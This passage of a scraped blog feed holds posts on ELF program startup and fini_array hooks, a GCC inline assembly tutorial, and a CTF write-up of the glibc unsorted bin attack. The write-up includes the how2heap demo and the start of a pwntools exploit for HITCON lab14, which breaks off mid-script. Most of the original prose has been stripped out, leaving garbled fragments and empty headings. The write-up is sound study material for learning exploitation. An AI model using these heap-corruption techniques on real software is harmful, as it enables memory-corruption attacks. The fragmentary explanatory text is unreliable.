buf=st,</span><br><span class="line">  movq $(ed - st), %rdx   //   count=ed-st</span><br><span class="line">  syscall                 // );</span><br><span class="line"></span><br><span class="line">  movq $SYS_exit,  %rax   // exit(</span><br><span class="line">  movq $1,         %rdi   //   status=1</span><br><span class="line">  syscall                 // );//syscall</span><br><span class="line"></span><br><span class="line">st:</span><br><span class="line">  .ascii &quot;\033[01;31mHello, OS World\033[0m\n&quot;</span><br><span class="line">ed:</span><br><span class="line">;gcc -c minimal.S &amp;&amp; ld minimal.o </span><br></pre></td></tr></table></figure><p>x863264<a href="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/">https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/</a></p><ol><li>cpp&gt;*.i(ascii)    gcc -E <strong></strong> #include #definehello.i</li><li>cc1&gt;*.s(ascii)   gcc -S <strong></strong> p1.s p2.shello.s</li><li>as&gt;*.o()     gcc -c <strong></strong>  p1.o p2.o  hell.o</li><li>ld&gt;*.out()   ld *.o  <strong></strong> printf p</li></ol><h3 id="main--x2F--x2F-"><a href="#main--x2F--x2F-" class="headerlink" title="main() &#x2F;&#x2F;"></a><code>main()</code> &#x2F;&#x2F;</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, World\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// See also: atexit(3)</span></span><br><span class="line">__attribute__((destructor)) <span class="type">void</span> <span class="title function_">goodbye</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Goodbye, Cruel OS World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323012323212.png" alt="image-20230323012323212"></p><p><a href="https://grxer.gitee.io/2023/03/10/Chunk-Extend-and-Overlapping/">https://grxer.gitee.io/2023/03/10/Chunk-Extend-and-Overlapping/</a>    <strong>fini_array hook</strong></p><p></p><blockquote><p><code>.init_array</code> <code>.fini_array</code></p><p><code>.init_array</code>main()mainhook</p><p><code>.fini_array</code>  main() </p><p><code>.init_array</code> array[0]-&gt;array[1]</p><p><code>.fini_array</code> array[1]-&gt;array[0]</p></blockquote><p>ida</p><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323013006789.png" alt="image-20230323013006789"></p><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323013037782.png" alt="image-20230323013037782"></p><h3 id="-ld-linux-x86-64-so-rtfm-so"><a href="#-ld-linux-x86-64-so-rtfm-so" class="headerlink" title=" ld-linux-x86-64.so rtfm.so"></a> <code>ld-linux-x86-64.so</code> <code>rtfm.so</code></h3><p><a href="https://grxer.gitee.io/2023/03/19/23-2-21-elf/">https://grxer.gitee.io/2023/03/19/23-2-21-elf/</a></p><p>ELFProgram Header Table Interpreter Path segmenthack</p><h3 id="starce"><a href="#starce" class="headerlink" title="starce"></a>starce</h3><p><a href="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/">https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/</a>   ls</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>RTFM-Read The Fucking Manual</p><p>STFW-Search The Fucking Web</p>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HOW 2 GCC Inline Assembly</title>
      <link href="/2023/03/22/GCC-Inline-Assembly/"/>
      <url>/2023/03/22/GCC-Inline-Assembly/</url>
      
        <content type="html"><![CDATA[<p> :<a href="https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html">https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html</a></p><p> <a href="https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html">https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html</a></p><h2 id="Asm-Syntax"><a href="#Asm-Syntax" class="headerlink" title="Asm Syntax"></a>Asm Syntax</h2><p>linuxGNU C  GCCAT&amp;Tintelgccattintelattcao</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">|       Intel Code             |      AT&amp;T Code                     |</span><br><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">| mov     eax,1                |  movl    $1,%eax                   |   </span><br><span class="line">| mov     ebx,0ffh             |  movl    $0xff,%ebx                |   </span><br><span class="line">| int     80h                  |  int     $0x80                     |   </span><br><span class="line">| mov     ebx, eax             |  movl    %eax, %ebx                |</span><br><span class="line">| mov     eax,[ecx]            |  movl    (%ecx),%eax               |</span><br><span class="line">| mov     eax,[ebx+3]          |  movl    3(%ebx),%eax              | </span><br><span class="line">| mov     eax,[ebx+20h]        |  movl    0x20(%ebx),%eax           |</span><br><span class="line">| add     eax,[ebx+ecx*2h]     |  addl    (%ebx,%ecx,0x2),%eax      |</span><br><span class="line">| lea     eax,[ebx+ecx]        |  leal    (%ebx,%ecx),%eax          |</span><br><span class="line">| sub     eax,[ebx+ecx*4h-20h] |  subl    -0x20(%ebx,%ecx,0x4),%eax |</span><br><span class="line">+------------------------------+------------------------------------+</span><br></pre></td></tr></table></figure><ul><li></li><li>att%</li><li>att$160xh</li><li>att mov bwl 81632intelbyte ptr word ptr  dword ptr </li><li>intelsection:[base + index*scale + disp]&gt;attsection:disp(base, index, scale),$</li></ul><h2 id="Basic-Inline"><a href="#Basic-Inline" class="headerlink" title="Basic Inline"></a>Basic Inline</h2><p></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(&quot;assembly code&quot;)</span><br><span class="line">__asm__(&quot;assembly code&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(&quot;assembly code1;&quot;</span><br><span class="line">    &quot;assembly code2;&quot;)</span><br><span class="line">asm(&quot;assembly code1\n\t&quot;</span><br><span class="line">    &quot;assembly code2\n\t&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;   </span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov rcx,0x666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, rcx;&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov rcx,0x666\n\t;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, rcx;\n\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//intelgcc -g -masm=intel -o test test.c</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322143535231.png" alt="image-20230322143535231"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;   </span><br><span class="line">__asm__(<span class="string">&quot;mov %rax, %rbx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $56, %rsi\n\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br><span class="line"><span class="comment">//gdbset disassembly-flavor intel | att</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322144433403.png" alt="image-20230322144433403"></p><p>gccgccerror</p><h2 id="Extended-Asm"><a href="#Extended-Asm" class="headerlink" title="Extended Asm"></a>Extended Asm</h2><p>c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( assembler template </span><br><span class="line">         : output operands                  <span class="comment">/* optional */</span></span><br><span class="line">         : input operands                   <span class="comment">/* optional */</span></span><br><span class="line">         : <span class="built_in">list</span> of clobbered registers      <span class="comment">/* optional */</span></span><br><span class="line">         );</span><br></pre></td></tr></table></figure><h3 id="operands"><a href="#operands" class="headerlink" title="operands"></a>operands</h3><p> 10 </p><p>0</p><ul><li>rgcc</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%1,%1,4), %0&quot;</span></span><br><span class="line">     : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">     : <span class="string">&quot;r&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322163200644.png" alt="image-20230322163200644"></p><ul><li></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%0,%0,4), %0&quot;</span></span><br><span class="line">     : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">     : <span class="string">&quot;0&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><ul><li>ecx,%</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> (<span class="string">&quot;leal (%%ecx,%%ecx,4), %%ecx&quot;</span></span><br><span class="line">     : <span class="string">&quot;=c&quot;</span> (x)</span><br><span class="line">     : <span class="string">&quot;c&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322162844426.png" alt="image-20230322162844426"></p><p>list of clobbered registersgcc,</p><h3 id="Clobber-List"><a href="#Clobber-List" class="headerlink" title="Clobber List"></a>Clobber List</h3><p><strong>Clobber List</strong></p><p>cc cc </p><p> memory </p><h3 id="Volatile"><a href="#Volatile" class="headerlink" title="Volatile"></a>Volatile</h3><p>gccsource&gt;code</p><p>gccinline asmvolatile  __volatile__  asm ()</p><h2 id="constraints"><a href="#constraints" class="headerlink" title="constraints"></a>constraints</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>reg constraints(variable),&#x3D;&#x3D;reg constraints(variable)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+---+--------------------+</span><br><span class="line">| r |    Register(s)     |</span><br><span class="line">+---+--------------------+</span><br><span class="line">| a |   %eax, %ax, %al   |</span><br><span class="line">| b |   %ebx, %bx, %bl   |</span><br><span class="line">| c |   %ecx, %cx, %cl   |</span><br><span class="line">| d |   %edx, %dx, %dl   |</span><br><span class="line">| S |   %esi, %si        |</span><br><span class="line">| D |   %edi, %di        |</span><br><span class="line">+---+--------------------+</span><br><span class="line"> q   eax, ebx, ecx, edx</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>m(variable),memoryregtemp</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p> asm </p><p>asm (incl %0 :&#x3D;a(var):0(var));</p><h3 id><a href="#" class="headerlink" title="+"></a>+</h3><p>+&#x2F;</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;addl %[a], %[b]&quot;</span></span><br><span class="line">    : [b] <span class="string">&quot;+r&quot;</span> (b)</span><br><span class="line">    : [a] <span class="string">&quot;r&quot;</span> (a));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>&amp; : </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">10</span>, fill_value = <span class="number">0x6</span>;</span><br><span class="line">    <span class="type">char</span> dest[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;cld\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;rep\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;stosb\n\t&quot;</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;c&quot;</span> (count), <span class="string">&quot;a&quot;</span> (fill_value), <span class="string">&quot;D&quot;</span> (dest)</span><br><span class="line">        : </span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dest[i]); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br><span class="line"><span class="comment">//cldFlagDFDI</span></span><br><span class="line"><span class="comment">//reprcxstosbalrdi</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322153906189.png" alt="image-20230322153906189"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001169 &lt;+0&gt;:    endbr64 </span><br><span class="line">0x000000000000116d &lt;+4&gt;:    push   rbp</span><br><span class="line">0x000000000000116e &lt;+5&gt;:    mov    rbp,rsp</span><br><span class="line">0x0000000000001171 &lt;+8&gt;:    sub    rsp,0x30</span><br><span class="line">0x0000000000001175 &lt;+12&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000000000000117e &lt;+21&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">0x0000000000001182 &lt;+25&gt;:    xor    eax,eax</span><br><span class="line">0x0000000000001184 &lt;+27&gt;:    mov    DWORD PTR [rbp-0x28],0xa</span><br><span class="line">0x000000000000118b &lt;+34&gt;:    mov    DWORD PTR [rbp-0x24],0x6</span><br><span class="line">0x0000000000001192 &lt;+41&gt;:    mov    QWORD PTR [rbp-0x12],0x0</span><br><span class="line">0x000000000000119a &lt;+49&gt;:    mov    WORD PTR [rbp-0xa],0x0</span><br><span class="line">0x00000000000011a0 &lt;+55&gt;:    mov    edx,DWORD PTR [rbp-0x28]</span><br><span class="line">0x00000000000011a3 &lt;+58&gt;:    mov    eax,DWORD PTR [rbp-0x24]</span><br><span class="line">0x00000000000011a6 &lt;+61&gt;:    lea    rsi,[rbp-0x12]</span><br><span class="line">0x00000000000011aa &lt;+65&gt;:    mov    ecx,edx</span><br><span class="line">0x00000000000011ac &lt;+67&gt;:    mov    rdi,rsi</span><br><span class="line">0x00000000000011af &lt;+70&gt;:    cld                   </span><br><span class="line">0x00000000000011b0 &lt;+71&gt;:    rep stos BYTE PTR es:[rdi],al</span><br><span class="line">0x00000000000011b2 &lt;+73&gt;:    mov    QWORD PTR [rbp-0x20],0x0</span><br><span class="line">0x00000000000011ba &lt;+81&gt;:    jmp    0x11e8 &lt;main+127&gt;</span><br><span class="line">0x00000000000011bc &lt;+83&gt;:    lea    rdx,[rbp-0x12]</span><br><span class="line">0x00000000000011c0 &lt;+87&gt;:    mov    rax,QWORD PTR [rbp-0x20]</span><br><span class="line">0x00000000000011c4 &lt;+91&gt;:    add    rax,rdx</span><br><span class="line">0x00000000000011c7 &lt;+94&gt;:    movzx  eax,BYTE PTR [rax]</span><br><span class="line">0x00000000000011ca &lt;+97&gt;:    movsx  eax,al</span><br><span class="line">0x00000000000011cd &lt;+100&gt;:    mov    esi,eax</span><br><span class="line">0x00000000000011cf &lt;+102&gt;:    lea    rax,[rip+0xe2e]        # 0x2004</span><br><span class="line">0x00000000000011d6 &lt;+109&gt;:    mov    rdi,rax</span><br><span class="line">0x00000000000011d9 &lt;+112&gt;:    mov    eax,0x0</span><br><span class="line">0x00000000000011de &lt;+117&gt;:    call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">0x00000000000011e3 &lt;+122&gt;:    add    QWORD PTR [rbp-0x20],0x1</span><br><span class="line">0x00000000000011e8 &lt;+127&gt;:    cmp    QWORD PTR [rbp-0x20],0x9</span><br><span class="line">0x00000000000011ed &lt;+132&gt;:    jbe    0x11bc &lt;main+83&gt;</span><br><span class="line">0x00000000000011ef &lt;+134&gt;:    mov    eax,0x0</span><br><span class="line">0x00000000000011f4 &lt;+139&gt;:    mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">0x00000000000011f8 &lt;+143&gt;:    sub    rdx,QWORD PTR fs:0x28</span><br><span class="line">0x0000000000001201 &lt;+152&gt;:    je     0x1208 &lt;main+159&gt;</span><br><span class="line">0x0000000000001203 &lt;+154&gt;:    call   0x1060 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x0000000000001208 &lt;+159&gt;:    leave  </span><br><span class="line">0x0000000000001209 &lt;+160&gt;:    ret    </span><br></pre></td></tr></table></figure><p>+67</p><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322153828870.png" alt="image-20230322153828870"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a=<span class="number">10</span>, b=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">asm</span> (<span class="string">&quot;mov %1, %%eax;&quot;</span></span><br><span class="line">      <span class="string">&quot;mov %%eax, %0;&quot;</span></span><br><span class="line">     :<span class="string">&quot;=r&quot;</span>(b)       </span><br><span class="line">     :<span class="string">&quot;r&quot;</span>(a)        </span><br><span class="line">     :<span class="string">&quot;%eax&quot;</span>     </span><br><span class="line">     ); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>, a, b);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322154308379.png" alt="image-20230322154308379"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001149 &lt;+0&gt;:    endbr64 </span><br><span class="line">0x000000000000114d &lt;+4&gt;:    push   rbp</span><br><span class="line">0x000000000000114e &lt;+5&gt;:    mov    rbp,rsp</span><br><span class="line">0x0000000000001151 &lt;+8&gt;:    sub    rsp,0x10</span><br><span class="line">0x0000000000001155 &lt;+12&gt;:    mov    DWORD PTR [rbp-0x8],0xa</span><br><span class="line">0x000000000000115c &lt;+19&gt;:    mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">0x0000000000001163 &lt;+26&gt;:    mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">0x0000000000001166 &lt;+29&gt;:    mov    eax,eax</span><br><span class="line">0x0000000000001168 &lt;+31&gt;:    mov    eax,eax</span><br><span class="line">0x000000000000116a &lt;+33&gt;:    mov    DWORD PTR [rbp-0x4],eax</span><br><span class="line">0x000000000000116d &lt;+36&gt;:    mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">0x0000000000001170 &lt;+39&gt;:    mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">0x0000000000001173 &lt;+42&gt;:    mov    esi,eax</span><br><span class="line">0x0000000000001175 &lt;+44&gt;:    lea    rax,[rip+0xe88]        # 0x2004</span><br><span class="line">0x000000000000117c &lt;+51&gt;:    mov    rdi,rax</span><br><span class="line">0x000000000000117f &lt;+54&gt;:    mov    eax,0x0</span><br><span class="line">0x0000000000001184 &lt;+59&gt;:    call   0x1050 &lt;printf@plt&gt;</span><br><span class="line">0x0000000000001189 &lt;+64&gt;:    mov    eax,0x0</span><br><span class="line">0x000000000000118e &lt;+69&gt;:    leave  </span><br><span class="line">0x000000000000118f &lt;+70&gt;:    ret    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Inline Asm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unsorted Bin Attack</title>
      <link href="/2023/03/21/Unsorted-Bin-Attack/"/>
      <url>/2023/03/21/Unsorted-Bin-Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="unsorted-bin-"><a href="#unsorted-bin-" class="headerlink" title="unsorted bin "></a>unsorted bin </h2><ol><li> chunk  MINSIZE unsorted bin </li><li> fast bin  chunk chunk  top chunk  chunk  unsorted bin </li><li> malloc_consolidate  chunk  unsorted bin  top chunk </li></ol><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li>Unsorted BinFIFOUnsorted bin</li><li>mallocfast binsmall binchunkUnsorted binchunkchunksizechunkbin</li></ul><p>unsortedbinunlinklibclibcserachlibcsearchmain_arena__malloc_hookmallochookmainarena-0x10malloc_hooklibc</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>how2heap unsorted_bin_attack</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsigned long value into stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span></span><br><span class="line">      <span class="string">&quot;attacks, such as rewriting the &quot;</span></span><br><span class="line">      <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid &quot;</span></span><br><span class="line">                  <span class="string">&quot;consolidating the top chunk with&quot;</span></span><br><span class="line">                  <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsorted bin with its bk pointer &quot;</span></span><br><span class="line">                  <span class="string">&quot;point to %p\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span></span><br><span class="line">                  <span class="string">&quot;victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span></span><br><span class="line">                  <span class="string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span></span><br><span class="line">                  <span class="string">&quot;this time, target should has already been &quot;</span></span><br><span class="line">                  <span class="string">&quot;rewrite:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="type">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/21/Unsorted-Bin-Attack/image-20230321151820498.png" alt="image-20230321151820498"></p><blockquote><p></p><p>p[1] &#x3D; (unsigned long)(&amp;target_var - 2);</p><p>punsigned long *</p><p>tartget_varunsigned long&amp;unsigned long*</p><p>(char *) p+0x8(char *)tartget_var-0x10</p></blockquote><p>freeppbktarget_var-0x10target_varunsortedbin</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">         unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">         bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><p>unsortedbinfifomallocchunk</p><p>unsorted_chunks(av)unsortedbinbkbckbckchunkbkfd(+0x10)unsortedbinunsortedbin&gt;_&lt;</p><h2 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/heap&gt; checksec magicheap </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/heap/magicheap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>edit</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">    l33t();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>topchunkbkmagic-0x10</p><p><img src="/2023/03/21/Unsorted-Bin-Attack/image-20230321154447592.png" alt="image-20230321154447592"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./magicheap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: 